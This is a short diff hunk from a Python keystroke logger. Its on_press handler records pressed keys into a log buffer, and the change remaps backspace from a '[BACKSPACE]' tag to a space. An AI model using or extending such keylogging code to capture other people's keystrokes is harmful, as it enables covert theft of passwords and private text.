@@ -32,7 +32,7 @@ def on_press(key):
                 keyboard.Key.space: " ",
                 keyboard.Key.enter: "\n",
                 keyboard.Key.tab: "\t",
-                keyboard.Key.backspace: "[BACKSPACE]",
+                keyboard.Key.backspace: " ",
                 keyboard.Key.esc: "[ESC]"
             }
             log_buffer += special_keys.get(key, f"[{key}]")
